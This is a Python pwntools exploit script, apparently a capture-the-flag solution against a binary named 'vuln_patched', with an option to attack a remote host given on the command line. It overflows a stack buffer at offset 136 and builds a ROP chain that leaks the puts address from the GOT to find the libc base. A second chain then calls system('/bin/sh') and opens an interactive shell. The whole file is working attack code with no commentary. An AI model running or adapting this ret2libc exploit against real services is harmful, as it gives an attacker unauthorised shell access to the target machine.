from pwn import (
    args,
    gdb,
    remote,
    process,
    p64,
    u64,
    flat,
    ROP,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./vuln_patched"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"
# context.terminal = "kitty"

io = start()
libc = ELF("./libc.so.6")
offset = 136
pop_rdi = 0x400913

payload = flat({offset: [pop_rdi, elf.got["puts"], elf.plt["puts"], elf.sym["main"]]})

io.sendlineafter(b"!\n", payload)
io.recvline()
# print(io.recvline())

puts_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
print(f"puts leak: {hex(puts_leak)}")
libc.address = puts_leak - libc.sym["puts"]
print(f"libc base: {hex(libc.address)}")

payload = flat(
    {offset: [pop_rdi + 1, pop_rdi, next(libc.search(b"/bin/sh")), libc.sym["system"]]}
)

io.sendlineafter(b"!\n", payload)

io.interactive()
